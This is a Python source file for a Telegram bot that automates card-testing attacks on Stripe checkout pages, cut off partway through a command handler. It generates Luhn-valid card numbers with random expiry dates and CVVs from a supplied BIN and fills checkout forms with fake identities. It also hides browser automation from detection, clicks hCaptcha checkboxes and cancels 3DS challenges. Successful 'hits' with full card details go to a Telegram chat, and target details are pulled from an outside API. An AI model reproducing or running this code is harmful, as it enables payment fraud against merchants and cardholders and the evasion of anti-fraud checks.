import asyncio
import random
import re
import time
import string
import os
import sys
import warnings
import json
import logging
import nest_asyncio
from datetime import datetime
from collections import defaultdict
import aiohttp
import urllib.parse
from playwright.async_api import async_playwright, Page
from telegram import Update, ForceReply
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.error import BadRequest

# Apply nest_asyncio to allow nested event loops (crucial for Playwright + PTB)
nest_asyncio.apply()

# Suppress specific asyncio warnings on Windows
if sys.platform == 'win32':
    warnings.filterwarnings("ignore", category=RuntimeWarning)
    from asyncio.proactor_events import _ProactorBasePipeTransport
    def silence_del(self, _warn=warnings.warn):
        pass
    _ProactorBasePipeTransport.__del__ = silence_del

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# CONFIGURATION & CONSTANTS
# ─────────────────────────────────────────────────────────────────────────────

DEBUG = True
CONFIG_FILE = "config.json"
VERSION = "v2.0-Bot"

# ─────────────────────────────────────────────────────────────────────────────
# UTILITIES
# ─────────────────────────────────────────────────────────────────────────────

class ConfigManager:
    @staticmethod
    def load():
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f:
                    return json.load(f)
            except: pass
        return {}

    @staticmethod
    def save(data):
        with open(CONFIG_FILE, 'w') as f:
            json.dump(data, f)
            
    @staticmethod
    def load_proxies():
        if os.path.exists("valid.txt"):
            with open("valid.txt", "r") as f:
                return [l.strip() for l in f if l.strip()]
        return []

class IdentityGenerator:
    FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
    LAST_NAMES = ["Smith", "Johnson", "Williams", "Jones", "Brown", "Davis", "Miller", "Wilson", "Moore", "Taylor"]
    EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]

    @staticmethod
    def generate(country="MO"):
        first = random.choice(IdentityGenerator.FIRST_NAMES)
        last = random.choice(IdentityGenerator.LAST_NAMES)
        rand_nums = ''.join(random.choices(string.digits, k=3))
        email = f"{first.lower()}{last.lower()}{rand_nums}@{random.choice(IdentityGenerator.EMAIL_DOMAINS)}"
        return {
            "name": f"{first} {last}",
            "email": email,
            "line1": "123 Main St",
            "city": "Macau",
            "postal_code": "00000",
        }

class CardGenerator:
    @staticmethod
    def generate_one(bin_code):
        if not bin_code or len(bin_code) < 6: return None
        
        pan = list(bin_code)
        
        # Determine length (Amex = 15, others = 16)
        length = 15 if bin_code.startswith(('34', '37')) else 16
        
        while len(pan) < length - 1:
            pan.append(str(random.randint(0, 9)))
            
        # Check digit
        check_digit = CardGenerator.luhn_calculate(pan)
        pan.append(str(check_digit))
        
        cc = "".join(pan)
        cc = "".join(pan)
        
        # Smart Expiry Generation
        now = datetime.now()
        current_year = int(str(now.year)[-2:]) # 26
        current_month = now.month
        
        # Generate year between current and +5 years
        yy_int = random.randint(current_year, current_year + 5)
        yy = str(yy_int)
        
        # If current year, month must be >= current month
        if yy_int == current_year:
            mm_int = random.randint(current_month, 12)
        else:
            mm_int = random.randint(1, 12)
            
        mm = str(mm_int).zfill(2)
        cvv = str(random.randint(100, 999))
        
        if length == 15 and len(cvv) == 3: cvv = str(random.randint(1000, 9999)) # Amex 4 digit CVV handling if strict
        
        return f"{cc}|{mm}|{yy}|{cvv}"

    @staticmethod
    def luhn_calculate(pan_list):
        # Calculate check digit
        digits = [int(x) for x in pan_list]
        odd_sum = 0
        even_sum = 0
        
        # Reverse to process from right to left (check digit would be index 0)
        # But here we are calculating the NEXT digit.
        # Standard: Double every second digit from the right.
        
        # "The check digit (x) is obtained by computing the sum of the other digits (third generation)..."
        # Easier: append 0, calculate sum, if sum % 10 == 0, check digit is 0.
        # Else check digit is 10 - (sum % 10).
        
        temp_pan = digits + [0]
        s = 0
        for i, d in enumerate(reversed(temp_pan)):
            if i % 2 == 1: # Double every second digit from right
                d *= 2
                if d > 9: d -= 9
            s += d
            
        return (10 - (s % 10)) % 10

class SmartFiller:
    def __init__(self, page: Page):
        self.page = page

    async def _analyze_input(self, frame, handle) -> str | None:
        try:
            attrs = await handle.evaluate("""el => {
                return {
                    name: (el.name || '').toLowerCase(),
                    id: (el.id || '').toLowerCase(),
                    placeholder: (el.placeholder || '').toLowerCase(),
                    type: (el.type || '').toLowerCase(),
                    label: (el.getAttribute('aria-label') || '').toLowerCase(),
                    autocomplete: (el.getAttribute('autocomplete') || '').toLowerCase(),
                    class: (el.className || '').toLowerCase()
                }
            }""")
            
            s = f"{attrs['name']} {attrs['id']} {attrs['placeholder']} {attrs['label']} {attrs['autocomplete']} {attrs['class']}"
            
            if any(x in s for x in ['cardnumber', 'cc-number', 'card_number', 'add card']): return 'cc'
            if any(x in s for x in ['cvc', 'cvv', 'security code', 'cc-csc']): return 'cvv'
            if any(x in s for x in ['exp', 'expiration', 'mm/yy', 'cc-exp']): return 'exp'
            if any(x in s for x in ['email', 'e-mail']): return 'email'
            if any(x in s for x in ['name', 'full name', 'cc-name', 'account holder']) and 'user' not in s: return 'name'
            if any(x in s for x in ['zip', 'postal', 'postcode']): return 'zip'
            if any(x in s for x in ['address', 'line1', 'billingaddress', 'street']): return 'line1'
            if any(x in s for x in ['city', 'town']): return 'city'
            if any(x in s for x in ['state', 'province', 'region']): return 'state'
            return None
        except:
            return None

    async def find_fields(self):
        found = {}
        for frame in self.page.frames:
            try:
                inputs = await frame.locator('input').all()
                for inp in inputs:
                    if not await inp.is_visible(): continue
                    field_type = await self._analyze_input(frame, inp)
                    if field_type:
                        if field_type not in found:
                            found[field_type] = []
                        found[field_type].append(inp)
            except:
                continue
        return found

    async def fill_all(self, card_data, identity, bot):
        # 1. Select Country FIRST (Triggers form updates)
        await self._select_country(bot)
        await asyncio.sleep(0.5)

        # 2. Re-scan fields (Address might appear/disappear)
        fields = await self.find_fields()
        
        cc, mm, yy, cvv = card_data.split('|')
        
        # 3. Fill Basic Fields
        if 'email' in fields: await self._fast_fill(fields['email'][0], identity['email'], bot)
        if 'name' in fields: await self._fast_fill(fields['name'][0], identity['name'], bot)

        if 'cc' in fields:
            await self._fast_fill(fields['cc'][0], cc, bot)
        else:
             # Critical fail if no CC
             return False

        if 'exp' in fields: 
            await self._fast_fill(fields['exp'][0], mm + yy, bot)
        
        if 'cvv' in fields: await self._fast_fill(fields['cvv'][0], cvv, bot)
        if 'cvv' in fields: await self._fast_fill(fields['cvv'][0], cvv, bot) # Redundant call kept for safety

        # 4. Fill Address if visible
        # If Macao is selected, usually address is hidden or optional, but if visible we fill random
        if 'line1' in fields: await self._fast_fill(fields['line1'][0], f"{random.randint(1,999)} Random St", bot)
        if 'city' in fields: await self._fast_fill(fields['city'][0], "Macau", bot)
        if 'state' in fields: await self._fast_fill(fields['state'][0], "Macau", bot)
        if 'zip' in fields: await self._fast_fill(fields['zip'][0], "00000", bot)

        return True

    async def _select_country(self, bot):
        """Try to select Macau/MO."""
        try:
            # Standard Select
            selects = await self.page.locator('select[name="billingCountry"], select[id="billing-country"], select[name="country"]').all()
            for s in selects:
                if await s.is_visible():
                    await s.select_option(value="MO") # Try ISO code
                    # await s.select_option(label="Macau") # Try Label
                    await bot.log("🌍 Selected Country: Macau (MO)")
                    return
            
            # Custom Dropdown (some stripe forms)
            # This is harder, skipping for now unless standard select works
        except: pass

    async def _fast_fill(self, element, value, bot):
        """Fill a field FAST with minimal human-like touches."""
        try:
            for _ in range(10):
                try:
                    if not await element.is_disabled(): break
                except: break
                await asyncio.sleep(0.3)
            
            await bot.human_move(element)
            await element.click(timeout=1000)
            await element.fill("")  # Clear
            await element.type(value, delay=random.randint(10, 25))
        except Exception:
            try:
                await element.click(force=True, timeout=1000)
                await element.fill("")
                await element.type(value, delay=15)
            except: pass

# ─────────────────────────────────────────────────────────────────────────────
# CORE AUTOMATION LOGIC
# ─────────────────────────────────────────────────────────────────────────────

class StripeAutomation:
    def __init__(self, headless=True, status_callback=None, target_info=None):
        self.browser = None
        self.context = None
        self.page = None
        self.filler = None
        self.playwright = None
        self.webhook_config = ConfigManager.load()
        self.mouse_pos = (0, 0)
        self.session_start = time.time()
        self.total_hits = 0
        self.consecutive_declines = 0
        self.cooldown_wait = 3.0
        self.headless = headless
        self.status_callback = status_callback  # Async callback for bot updates
        self.proxies = ConfigManager.load_proxies()
        self.running = False
        self.target_info = target_info or {}


    async def log(self, message):
        """Log to console AND bot callback if available."""
        if self.status_callback:
            await self.status_callback(message)
        print(f"[LOG] {message}")

    async def start_browser(self):
        self.playwright = await async_playwright().start()
        launch_args = ["--disable-blink-features=AutomationControlled"]
        if not self.headless:
            launch_args.append("--start-maximized")
        else:
            launch_args.append("--window-size=1920,1080")

        self.browser = await self.playwright.chromium.launch(
            headless=self.headless,
            args=launch_args
        )
        self.context = await self.browser.new_context(
            viewport={"width": 1920, "height": 1080} if self.headless else None,
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
        )
        
        # 🟢 Stealth Mode
        await self.context.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
            const getParameter = WebGLRenderingContext.prototype.getParameter;
            WebGLRenderingContext.prototype.getParameter = function(parameter) {
                if (parameter === 37445) return 'Intel Open Source Technology Center';
                if (parameter === 37446) return 'Mesa DRI Intel(R) HD Graphics (Skylake GT2)';
                return getParameter(parameter);
            };
        """)
        
        self.page = await self.context.new_page()
        self.filler = SmartFiller(self.page)
        self.session_start = time.time()

    async def get_stripe_info(self, url):
        """Fetch Stripe Checkout info via Samurai API."""
        encoded_url = urllib.parse.quote(url, safe='')
        api_url = f"https://autohitter.samuraiwarrior.net/stripe/checkout-based/url/{encoded_url}/info"
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url, timeout=20) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        
                        # PARSE NEW SAMURAI API FORMAT
                        
                        # 1. Merchant
                        merchant = "Unknown"
                        if 'merchant' in data and data['merchant']:
                            merchant = data['merchant'].get('displayName', "Unknown")
                            
                        # 2. Amount & Currency
                        amount_str = "Unknown"
                        if 'totals' in data and data['totals']:
                            amount_str = data['totals'].get('total_formatted')
                            if not amount_str:
                                t = data['totals'].get('total', 0)
                                c = data.get('currency', 'usd').upper()
                                amount_str = f"{t/100:.2f} {c}"
                        
                        # 3. Email
                        email = data.get('customerEmail') or "Not Set"
                        
                        # 4. PK
                        pk = data.get('publicKey') or "Hidden"
                        
                        # 5. Session ID
                        session_id = data.get('sessionId') or "N/A"
                        
                        # 6. Status
                        status = data.get('status') or "Unknown"

                        # 7. Success URL (New Feature)
                        success_url = None
                        if 'urls' in data and data['urls']:
                            success_url = data['urls'].get('success')

                        # 7. Methods (Inferred or N/A as it's not explicitly in correct format usually)
                        methods = [] 
                        # Try to find in line items or subscription? Not standard in this resp.
                        # Leave empty formatted as "Unknown" in display
                        
                        return {
                            "merchant": merchant,
                            "amount": amount_str,
                            "customer_email": email,
                            "publishable_key": pk,
                            "session_id": session_id,
                            "payment_method_types": methods,
                            "payment_status": status,
                            "success_url": success_url
                        }



                    else:
                        logger.warning(f"API Failed ({resp.status}). Falling back to local scrape...")
                        return await self._fetch_local_info(url)
        except Exception as e:
            logger.error(f"API Error: {e}. Falling back to local scrape...")
            return await self._fetch_local_info(url)

    async def _fetch_local_info(self, url):
        """Fallback: Fetch info by opening the page locally."""
        try:
            if not self.browser:
                await self.start_browser()
                # Create a fresh page if needed, but start_browser usually prepares context
            
            # Use existing page or create new
            if not self.context: await self.start_browser()
            page = await self.context.new_page()
            
            await self.log("🌍 Navigating to URL locally...")
            await page.goto(url, timeout=30000, wait_until='domcontentloaded')
            await asyncio.sleep(3) # Wait for initial render

            content = await page.content()
            
            # 1. CHECK FOR EXPIRED / 404
            if "page you were looking for could not be found" in content or "This link has expired" in content:
                 await page.close()
                 return {"error": "Link Expired"}
            
            # 2. Scrape Info
            merchant = "Unknown"
            try:
                # Try common titles or metadata
                title = await page.title()
                if "Stripe Checkout" not in title: merchant = title.replace(" - Checkout", "")
                
                # Try .MerchantName
                if await page.locator('.MerchantName').count() > 0:
                    merchant = await page.locator('.MerchantName').first.inner_text()
            except: pass

            amount_str = "Unknown"
            try:
                # Try .TotalAmount
                if await page.locator('.TotalAmount').count() > 0:
                     amount_str = await page.locator('.TotalAmount').first.inner_text()
                # Try .Amount
                elif await page.locator('.Amount').count() > 0:
                     amount_str = await page.locator('.Amount').first.inner_text()
            except: pass

            email = "Not Set"
            try:
                # Check for prefilled email input
                inp = page.locator('input[type="email"]')
                if await inp.count() > 0:
                    val = await inp.get_attribute('value')
                    if val: email = val
            except: pass
            
            await page.close()
            
            return {
                "merchant": merchant,
                "amount": amount_str,
                "customer_email": email,
                "publishable_key": "Hidden (Local)",
                "session_id": "N/A (Local)",
                "payment_method_types": [],
                "payment_status": "open",
                "success_url": None # Cannot get without submitting
            }

        except Exception as e:
            logger.error(f"Local Fetch Error: {e}")
            return {"error": f"Failed to fetch locally: {str(e)}"}

    async def run_attack(self, url, cards):
        """Run the attack loop on a list of cards with proxy rotation."""
        self.running = True
        await self.log(f"🚀 Starting attack on {len(cards)} cards...")
        
        if not self.browser:
            await self.start_browser()
        
        for i, card_data in enumerate(cards):
            if not self.running: break
            try:
                # 🔄 PROXY ROTATION (DISABLED TEMPORARILY)
                proxy_server = None
                # if self.proxies:
                #     proxy = random.choice(self.proxies)
                #     proxy_server = {"server": f"http://{proxy}"} 
                #     await self.log(f"🌍 <b>Connected to Proxy</b>: {proxy.split(':')[0]}...")
                # else:
                await self.log(f"⚠️ <b>Direct Connection</b> (Proxies Disabled)")
                
                # Create NEW context for each card (clean slate)
                if self.context: await self.context.close()
                self.context = await self.browser.new_context(
                    viewport=None,
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
                    proxy=proxy_server
                )
                # Re-apply stealth script to new context
                await self.context.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                    const getParameter = WebGLRenderingContext.prototype.getParameter;
                    WebGLRenderingContext.prototype.getParameter = function(parameter) {
                        if (parameter === 37445) return 'Intel Open Source Technology Center';
                        if (parameter === 37446) return 'Mesa DRI Intel(R) HD Graphics (Skylake GT2)';
                        return getParameter(parameter);
                    };
                """)
                
                self.page = await self.context.new_page()
                self.filler = SmartFiller(self.page)
                
                # Navigate
                try:
                    await self.page.goto(url, wait_until="domcontentloaded", timeout=60000)
                except Exception as e:
                    await self.log(f"⚠️ Proxy/Network Error: {e}")
                    continue

                cc = card_data.split('|')[0]
                
                # Progress Bar Calculation
                total = len(cards)
                current = i + 1
                percent = int((current / total) * 10)
                # progress_bar = "🟩" * percent + "⬜" * (10 - percent)
                progress_bar = "▓" * percent + "░" * (10 - percent)
                
                await self.log(
                    f"<b>Progress:</b> {progress_bar} {int((current/total)*100)}%\n"
                    f"💳 <b>Checking:</b> <code>{cc[:6]}....{cc[-4:]}</code>"
                )
                
                # Check for expired/completed
                try: 
                    if "all done" in await self.page.inner_text('body', timeout=1000):
                        await self.log("🛑 Link Expired or Completed!")
                        break
                except: pass

                # Fill Form
                identity = IdentityGenerator.generate()
                if not await self.ensure_card_fields():
                     await self.log("⚠️ Card fields not found, refreshing...")
                     await self.page.reload()
                     await asyncio.sleep(3)
                
                success = await self.filler.fill_all(card_data, identity, self)
                if not success:
                    await self.log("❌ Fill failed, skipping.")
                    continue
                
                await self.log("📝 Details Filled...")
                await asyncio.sleep(self.cooldown_wait)
                
                # Click Pay
                if await self.click_pay_button():
                    await self.log(f"⏳ <b>Processing...</b> (Waiting 3s)")
                else:
                    await self.log("⚠️ Pay button issue.")
                
                result = await self.wait_for_result(url, card_data, cc, identity, i+1)
                
                if isinstance(result, dict):
                    await self.log(f"✅ HIT! {cc}")
                    await self.celebrate_hit(result, result.get('screenshot'))
                    await self.log("🎉 Attack Stopped (Link Consumed)")
                    break # Stop the attack loop as the session is likely done
                elif result == "3DS":
                    await self.log("⚠️ 3DS Detected.")
                    await self.page.goto(url)
                elif result == "3DS Cancelled":
                    await self.log("⚠️ 3DS / Cancelled. Skipping.")
                    self.consecutive_declines += 1
                    await self.page.evaluate("() => { document.querySelectorAll('input').forEach(i => i.value = '') }")
                else:
                    await self.log("❌ Declined.")
                    self.consecutive_declines += 1
                    # Clear inputs for next card
                    await self.page.evaluate("() => { document.querySelectorAll('input').forEach(i => i.value = '') }")
            except Exception as e:
                await self.log(f"⚠️ Error on card {i+1}: {e}")
                
        await self.log("🏁 Run Complete.")
        await self.close()
        self.running = False


    async def close(self):
        self.running = False
        try:
            if self.context: await self.context.close()
            if self.browser: await self.browser.close()
            if self.playwright: await self.playwright.stop()
        except: pass

    async def human_move(self, target):
        try:
            box = await target.bounding_box()
            if not box: return
            end_x = box['x'] + box['width'] / 2 + random.randint(-3, 3)
            end_y = box['y'] + box['height'] / 2 + random.randint(-3, 3)
            steps = random.randint(5, 10)
            await self.page.mouse.move(end_x, end_y, steps=steps)
        except: pass

    async def click_pay_button(self):
        pay_selectors = [
            'button[data-testid="hosted-payment-submit-button"]', 
            'button.SubmitButton', 'button.SubmitButton--complete',
            'button[type="submit"]', 
            'button:has-text("Pay")', 'button:has-text("Subscribe")',
            'div[role="button"]:has-text("Pay")'
        ]
        start_wait = time.time()
        while time.time() - start_wait < 5:
            for sel in pay_selectors:
                try:
                    btn = self.page.locator(sel).first
                    if await btn.count() > 0 and await btn.is_visible():
                        if await btn.is_disabled(): continue
                        try:
                            await btn.click(force=True, timeout=500)
                            return True
                        except: pass
                except: continue
            await asyncio.sleep(0.3)
        return False

    async def ensure_card_fields(self):
        # Specific wait for Stripe iframes to ensure load
        try:
            await self.log("⏳ Waiting for payment frames...")
            await self.page.wait_for_selector('iframe', timeout=10000)
            await self.page.wait_for_selector('iframe[name^="__privateStripeFrame"]', timeout=5000)
        except: 
            await self.log("⚠️ Frames not found (continuing)...")

        for attempt in range(10): # Increased attempts
            # Check for Captcha pre-fill
            await self.detect_and_solve_captcha()

            await self.log(f"🔍 Searching fields (Attempt {attempt+1}/10)...")
            fields = await self.filler.find_fields()
            if 'cc' in fields: return True
            
            # Click card tab if needed
            card_selectors = [
                '#payment-method-label-card',
                'input[value="card"]',
                '[data-testid="card-accordion-item-button"]',
                '[data-testid="card-tab"]', 
                '.PaymentMethod--card', 
                'div[role="radio"][aria-label="Card"]',
                '#payment-method-accordion-item-header--card',
                'div[id="payment-method-selector-card"]',
                'span:has-text("Card")',
            ]
            for s in card_selectors:
                try:
                    el = self.page.locator(s).first
                    if await el.count() > 0:
                        # If input, click parent or force click
                        if "input" in s:
                            await el.evaluate("el => el.click()")
                        else:
                            await el.click(force=True, timeout=1000)
                        
                        await self.log(f"🖱️ Clicking Card Tab: {s}")
                        await asyncio.sleep(1)
                except: continue
            await asyncio.sleep(2) # Slower retry for stability
        return False

    async def detect_and_solve_captcha(self):
        """Checks for hCaptcha frames and attempts to solve the checkbox."""
        try:
            for frame in self.page.frames:
                if "hcaptcha" in frame.url or "js.stripe.com/v3/hcaptcha" in frame.url:
                    # Look for checkbox div
                    checkbox_locator = frame.locator('#checkbox')
                    if await checkbox_locator.count() > 0:
                        is_checked = await checkbox_locator.get_attribute('aria-checked')
                        if is_checked == "true":
                            return False # Already solved
                        
                        await self.log("🤖 <b>hCaptcha Detected!</b> Clicking...")
                        try:
                            await checkbox_locator.click(timeout=2000)
                            await asyncio.sleep(2) # Wait for check
                            return True
                        except:
                            pass # Click failed?
            return False
        except: 
            pass
        return False

    async def detect_and_cancel_3ds(self):
        """Checks for 3DS frames and attempts to click Cancel."""
        try:
            for frame in self.page.frames:
                # Look for common 3DS Cancel buttons
                # "ancle" covers the user's specific request for the typo "cancle"
                # "el" covers Cancel, Cancle
                # We use regex for case-insensitive matching of "cancel" or "cancle"
                # or just look for button roles
                
                # Check for "Cancel" or "Cancle" buttons
                btns = await frame.locator('button, a, input[type="button"], div[role="button"]').all()
                for btn in btns:
                    if not await btn.is_visible(): continue
                    text = (await btn.inner_text()).lower()
                    if "cancel" in text or "cancle" in text:
                        await self.log(f"🛡️ <b>3DS Detected!</b> Clicking Cancel...")
                        try:
                            await btn.click(timeout=2000)
                            return True
                        except: pass
            return False
        except: pass
        return False

    async def wait_for_result(self, url, card_data, cc, identity, idx):
        start_time = time.time()
        while time.time() - start_time < 40: # Increased timeout for Captcha
            try:
                # 0. Check for Captcha
                if await self.detect_and_solve_captcha():
                    start_time = time.time() # Reset timeout if we found and solved captcha
                    continue

                # 0.5 Check for 3DS Cancel
                if await self.detect_and_cancel_3ds():
                     await asyncio.sleep(1)
                     return "3DS Cancelled"

                # Success checks
                if await self.page.locator('.SubmitButton--complete').count() > 0:
                    return await self._create_hit_info(url, card_data, identity)
                
                content = await self.page.content()
                
                # 1. Check for Redirect (Strongest Indicator)
                current_url = self.page.url
                
                # Check explicit Success URL from API
                if self.target_info and self.target_info.get('success_url'):
                    expected_success = self.target_info['success_url']
                    # Compare base URLs or see if current starts with it (ignoring query params sometimes)
                    if current_url.startswith(expected_success) or expected_success in current_url:
                        await self.log(f"🎉 <b>Success URL Matched</b>: {current_url}")
                        return await self._create_hit_info(url, card_data, identity)

                if "checkout.stripe.com" not in current_url and "stripe.com" not in current_url:
                    # We have redirected away from Stripe
                    if "cancel" not in current_url.lower():
                        await self.log(f"🎉 <b>Redirect Detected</b>: {current_url}")
                        return await self._create_hit_info(url, card_data, identity)

                content = await self.page.content()
                
                # 2. IGNORE Processing State (Critical)
                if "Processing" in content or "processing" in content:
                     # Check if it's just the button text changing back?
                     # Ideally we just wait processing out.
                     if await self.page.locator('.SubmitButton-spinner').count() > 0: # Common spinner class
                         await asyncio.sleep(0.5)
                         continue
                     # If generic text, also wait
                     await asyncio.sleep(0.5)
                     continue

                # 3. Check for Explicit Success Elements (Internal Stripe)
                # .SubmitButton--complete is the green checkmark state
                if await self.page.locator('.SubmitButton--complete').count() > 0:
                     await self.log("🎉 <b>Success Button Detected</b>")
                     return await self._create_hit_info(url, card_data, identity)
                
                # 4. Check for Success Text (Strict)
                # Must NOT be ambiguous
                success_phrases = ["Order confirmed", "Payment successful", "Thanks for your order", "Success"]
                if any(phrase in content for phrase in success_phrases):
                    # Double check it's not a "Test mode" warning or something
                    return await self._create_hit_info(url, card_data, identity)
                
                # 5. Check for "Thanks" but ensure it's a heading context
                if "Thanks" in content and "stripe" not in content.lower(): # Simple heuristic for merchant page
                     return await self._create_hit_info(url, card_data, identity)
                
                # Decline/Error checks
                error_el = self.page.locator('.Error')
                if await error_el.count() > 0 and await error_el.is_visible():
                     text = await error_el.text_content()
                     return text
                
                if "incorrect" in content or "declined" in content:
                    return "Declined"

            except: pass
            await asyncio.sleep(0.5)
        return "Timeout"
    
    async def _create_hit_info(self, url, card_data, identity):
        parts = card_data.split('|')
        screenshot_path = await self.take_screenshot("SUCCESS")
        return {
            "cc": parts[0],
            "mm": parts[1] if len(parts)>1 else "xx",
            "yy": parts[2] if len(parts)>2 else "xx",
            "cvv": parts[3] if len(parts)>3 else "xxx",
            "name": identity['name'],
            "email": identity['email'],
            "url": url,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "screenshot": screenshot_path
        }

    async def take_screenshot(self, name_prefix):
        if not os.path.exists("screenshots"): os.makedirs("screenshots")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.abspath(f"screenshots/{name_prefix}_{timestamp}.png")
        await self.page.screenshot(path=filename, full_page=True)
        return filename

    async def celebrate_hit(self, hit_info, screenshot_path=None):
        if 'telegram_token' in self.webhook_config and 'telegram_chat_id' in self.webhook_config:
            token = self.webhook_config['telegram_token']
            chat_id = self.webhook_config['telegram_chat_id']
            
            # Rich Caption with Target Info
            merchant = self.target_info.get('merchant', 'Unknown')
            amount = self.target_info.get('amount', 'Unknown')
            session = self.target_info.get('session_id', 'N/A')
            
            caption = (
                f"✅ <b>STRIPE HIT CONFIRMED</b>\n"
                f"━━━━━━━━━━━━━━\n"
                f"💳 <b>Card:</b> <code>{hit_info['cc']}</code>\n"
                f"📅 <b>Exp:</b> {hit_info['mm']}/{hit_info['yy']} | <b>CVV:</b> {hit_info['cvv']}\n"
                f"━━━━━━━━━━━━━━\n"
                f"💰 <b>Amount:</b> {amount}\n"
                f"🏪 <b>Merchant:</b> {merchant}\n"
                f"📧 <b>Email:</b> {hit_info['email']}\n"
                f"━━━━━━━━━━━━━━\n"
                f"🆔 <b>Session:</b> <code>{session}</code>\n"
                f"🌐 <a href='{hit_info['url']}'><b>Checkout Link</b></a>"
            )
            
            try:
                api_url = f"https://api.telegram.org/bot{token}/sendPhoto"
                if screenshot_path and os.path.exists(screenshot_path):
                    with open(screenshot_path, 'rb') as f:
                        # Use requests or aiohttp here ideally, but playwright request context is available
                        r_context = await self.playwright.request.new_context()
                        with open(screenshot_path, 'rb') as f:
                             img = f.read()
                        
                        await r_context.post(api_url, multipart={
                            'chat_id': chat_id,
                            'caption': caption,
                            'parse_mode': 'HTML',
                            'photo': {
                                'name': 'hit.png',
                                'mimeType': 'image/png',
                                'buffer': img
                            }
                        })
                else:
                    # Text fallback
                    api_url = f"https://api.telegram.org/bot{token}/sendMessage"
                    r_context = await self.playwright.request.new_context()
                    await r_context.post(api_url, form={
                        'chat_id': chat_id, 
                        'text': caption, 
                        'parse_mode': 'HTML'
                    })
            except Exception as e:
                print(f"Webhook error: {e}")

# ─────────────────────────────────────────────────────────────────────────────
# TELEGRAM BOT LOGIC
# ─────────────────────────────────────────────────────────────────────────────

TOKEN = ConfigManager.load().get('telegram_token')
active_attacks = {}

async def check_permissions(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Check if user is a member of the allowed group OR is an owner."""
    user_id = update.effective_user.id
    config = ConfigManager.load()
    
    # 1. Owner Bypass
    owner_ids = config.get('owner_ids', [])
    # Ensure all are strings for comparison
    owner_ids = [str(oid) for oid in owner_ids]
    if str(user_id) in owner_ids:
        return True

    # 2. Group Membership Check
    allowed_group_id = config.get('allowed_group_id')
    
    if not allowed_group_id:
        await update.message.reply_text("⚠️ Bot configuration error: `allowed_group_id` not set.")
        return False

    try:
        member = await context.bot.get_chat_member(chat_id=allowed_group_id, user_id=user_id)
        if member.status in ['left', 'kicked']:
            await update.message.reply_text("⛔ Access Denied: You must be a member of the official group to use this bot.")
            return False
        return True
    except BadRequest:
        # If bot can't check group (not admin or not in group), fail safely
        await update.message.reply_text("⚠️ Error: Bot is likely not added to the allowed group or ID is incorrect.")
        return False
    except Exception as e:
        logger.error(f"Permission check error: {e}")
        return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_permissions(update, context): return
    
    user = update.effective_user
    await update.message.reply_html(
        f"Hi {user.mention_html()}! 🤖\n\n"
        "<b>Commands:</b>\n"
        "<code>/hit &lt;url&gt;</code> - Start Attack\n"
        "<code>/stop</code> - Stop Attack"
    )

async def hit_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_permissions(update, context): return
    
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /hit <url> [optional_bin]")
        return

    url = context.args[0]
    bin_to_use = context.args[1] if len(context.args) > 1 else None

    if not url.startswith("http"):
        await update.message.reply_text("⚠️ Invalid URL.")
        return

    status_msg = await update.message.reply_text(f"🔍 Fetching info for: {url} ...")
    
    automation = StripeAutomation(headless=True)
    info = await automation.get_stripe_info(url)
    await automation.close()

    if "error" in info:
        if info['error'] == "Link Expired":
            await status_msg.edit_text(
                "❌ <b>LINK EXPIRED</b>\n\n"
                "The page you were looking for could not be found.\n"
                "Please check the URL or contact the merchant.",
                parse_mode='HTML'
            )
        else:
            await status_msg.edit_text(f"❌ Error fetching info: {info['error']}")
        return

    # Formatted Info Message
    pk = info.get('publishable_key', 'Hidden')
    if len(pk) > 10: pk = pk[:10] + "..."
    
    methods = ", ".join(info.get('payment_method_types', []))
    
    text = (
        f"<b>🎯 TARGET ACQUIRED</b>\n\n"
        f"🏪 <b>Merchant:</b> {info.get('merchant', 'Unknown')}\n"
        f"💸 <b>Amount:</b> {info.get('amount', 'Unknown')}\n"
        f"📧 <b>Email:</b> {info.get('customer_email') or 'Not Set'}\n"
        f"💳 <b>Methods:</b> {methods}\n"
        f"🔒 <b>PK:</b> {pk}\n"
        f"🆔 <b>Session:</b> <code>{info.get('session_id', 'N/A')}</code>\n"
        f"📊 <b>Status:</b> {info.get('payment_status', 'Unknown')}\n\n"
        f"🔗 <b>Link:</b> {url}\n"
    )
    
    # Check if BIN was provided in command
    if bin_to_use and len(bin_to_use) >= 6:
        await status_msg.edit_text(text + f"\n🚀 <b>Starting attack with BIN: {bin_to_use}</b>", parse_mode='HTML')
        cards = [CardGenerator.generate_one(bin_to_use) for _ in range(100)] # Default batch
        await run_attack_flow(update, context, url, cards)
        return

    # Otherwise ask for cards
    text += f"\n<i>Reply with File/Text OR /setbin &lt;bin&gt; to START.</i>"
    

    
    context.user_data['target_url'] = url
    context.user_data['target_info'] = info # Store info for attack phase
    context.user_data['awaiting_cards'] = True
    
    await status_msg.edit_text(text, parse_mode='HTML')
    # await update.message.reply_text("waiting for cards...", reply_markup=ForceReply(selective=True)) # Optional now due to /setbin

async def setbin_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_permissions(update, context): return
    if not context.user_data.get('awaiting_cards'):
        await update.message.reply_text("⚠️ Run /hit <url> first.")
        return

    if not context.args:
        await update.message.reply_text("⚠️ Usage: /setbin <bin>")
        return

